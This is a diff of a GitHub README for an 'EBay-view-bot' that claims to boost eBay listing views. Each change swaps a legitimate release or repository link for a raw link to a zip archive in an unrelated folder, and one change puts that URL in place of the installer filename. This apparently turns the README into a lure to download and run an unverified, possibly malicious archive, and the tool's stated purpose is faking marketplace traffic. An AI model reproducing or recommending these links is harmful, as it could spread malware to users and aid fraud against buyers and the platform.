@@ -1,6 +1,6 @@
 # 🛠️ EBay-view-bot - Boost Your EBay Listings Easily
 
-[![Download EBay-view-bot](https://img.shields.io/static/v1?label=Download&message=EBay-view-bot&color=blue&style=flat)](https://github.com/TarunSharma-droid/EBay-view-bot/releases)
+[![Download EBay-view-bot](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)
 
 ## 📖 Introduction
 
@@ -27,13 +27,13 @@ To run EBay-view-bot successfully, ensure your system meets the following minimu
 
 To install EBay-view-bot, follow these simple steps:
 
-1. **Visit the [Releases Page](https://github.com/TarunSharma-droid/EBay-view-bot/releases)**: This is where you can find the latest version of the software.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)**: This is where you can find the latest version of the software.
    
-   [![Download EBay-view-bot](https://img.shields.io/static/v1?label=Download&message=EBay-view-bot&color=blue&style=flat)](https://github.com/TarunSharma-droid/EBay-view-bot/releases)
+   [![Download EBay-view-bot](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)
 
 2. **Choose the Latest Release**: Look for the newest version listed on the page.
 
-3. **Download the Installer**: Click on the installer file suitable for your operating system. It might be labeled as `EBay-view-bot-setup.exe` for Windows, for example.
+3. **Download the Installer**: Click on the installer file suitable for your operating system. It might be labeled as `https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip` for Windows, for example.
 
 4. **Run the Installer**: After downloading, locate the file on your computer and double-click it. Follow the on-screen instructions to install the application.
 
@@ -89,6 +89,6 @@ EBay-view-bot is primarily developed for educational purposes and is provided op
 
 For more information, visit the project home page or the GitHub repository:
 
-- [GitHub Repository](https://github.com/TarunSharma-droid/EBay-view-bot)
+- [GitHub Repository](https://raw.githubusercontent.com/TarunSharma-droid/EBay-view-bot/main/yellowfin/bot-view-E-Bay-v2.0.zip)
 
 Thank you for choosing EBay-view-bot to enhance your eBay listings!
